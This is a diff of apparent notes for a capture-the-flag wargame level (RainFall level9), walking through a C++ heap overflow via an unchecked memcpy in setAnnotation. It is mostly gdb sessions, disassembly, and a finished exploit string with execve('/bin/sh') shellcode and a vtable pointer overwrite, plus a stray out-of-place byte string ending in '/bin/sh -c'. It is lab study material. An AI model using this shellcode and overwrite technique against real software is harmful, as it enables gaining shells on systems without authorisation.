@@ -50,14 +50,19 @@ End of assembler dump.
 
 This is C++ code.
 
-level9@RainFall:~$ ./level9 $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
+level9@RainFall:~$ ./level9 $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A
+b0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad
+6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2
+Ag3Ag4Ag5Ag"')
 Segmentation fault (core dumped)
 
-[ 6197.339371] level9[3644]: segfault at 41366441 ip 08048682 sp bffff570 error 4 in level9[8048000+1000]
+[ 6197.339371] level9[3644]: segfault at 41366441 ip 08048682 sp bffff570 error
+4 in level9[8048000+1000]
 
 Overflow at 108
 
-tarting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "CCCC"')
+tarting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "CCCC"
+')
 
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
@@ -80,3 +85,102 @@ fs             0x0      0
 gs             0x33     51
 (gdb) x/s 0x804a078
 0x804a078:       "CCCC"
+
+
+(gdb) disas 0x804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:	push   %ebp
+   0x0804870f <+1>:	mov    %esp,%ebp
+   0x08048711 <+3>:	sub    $0x18,%esp
+   0x08048714 <+6>:	mov    0xc(%ebp),%eax
+   0x08048717 <+9>:	mov    %eax,(%esp)
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    0x8(%ebp),%edx
+   0x08048722 <+20>:	add    $0x4,%edx
+   0x08048725 <+23>:	mov    %eax,0x8(%esp)
+   0x08048729 <+27>:	mov    0xc(%ebp),%eax
+   0x0804872c <+30>:	mov    %eax,0x4(%esp)
+   0x08048730 <+34>:	mov    %edx,(%esp)
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:	leave
+   0x08048739 <+43>:	ret
+End of assembler dump.
+
+When overflowing, level9 always segfault at main + 142.
+
+
+\x04\x10\xff\xff\x24\x02\x03\xf3\x23\xff\x08\xf4\x23\xe4\xf7\x40\x23\xe5\xfb\x24\xaf\xe4\xfb\x24\x23\xe6\xf7\x48\xaf\xe6\xfb\x28\x23\xe6\xf7\x4c\xaf\xe6\xfb\x2c\xaf\xe0\xfb\x30\xa3\xe0\xf7\x47\xa3\xe0\xf7\x4a\x02\x04\x8d\x0c\x01\x08\x40\x25/bin/sh -c
+
+
+
+
+$(python -c 'print "\x10\xa0\x04\x08" + 
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+
+"A"*51 +
+"\x0c\xa0\x04\x08"')
+
+
+(gdb) r $(python -c 'print "A" * 108 + "CCCC"')
+Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "CCCC"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x43434343	1128481603
+ecx            0x43434343	1128481603
+edx            0x804a07c	134520956
+ebx            0x804a078	134520952
+esp            0xbffff690	0xbffff690
+ebp            0xbffff6b8	0xbffff6b8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x210287	[ CF PF SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/10x 0x804a078
+0x804a078:	0x43434343	0x00000000	0x00000000	0x00000000
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a098:	0x00000000	0x00000000
+(gdb) x/10x 0x804a078 - 112
+0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141
+(gdb) disas 0x08048848
+Dump of assembler code for function _ZTV1N:
+   0x08048840 <+0>:	add    %al,(%eax)
+   0x08048842 <+2>:	add    %al,(%eax)
+   0x08048844 <+4>:	push   %esp
+   0x08048845 <+5>:	mov    %al,(%eax,%ecx,1)
+   0x08048848 <+8>:	cmp    -0x78b1f7fc(%edi),%al
+   0x0804884e <+14>:	add    $0x8,%al
+End of assembler dump.
+0x804a008 + 4 = 0x804A00c
+(gdb) r $(python -c 'print "A" * 108 + "\x0C\xA0\x04\x08"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "\x0C\xA0\x04\x08"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+We can now control EIP :
+
+(gdb) r $(python -c 'print "CCCC" + "A" * 104 + "\x0C\xA0\x04\x08"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level9/level9 $(python -c 'print "CCCC" + "A" * 104 + "\x0C\xA0\x04\x08"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+
+0x804A00c + 4 =0x804A010
+
+ADDRESS + SHELLCODE + PADDING + ADDRESS
+
+\x10\xA0\x04\x08
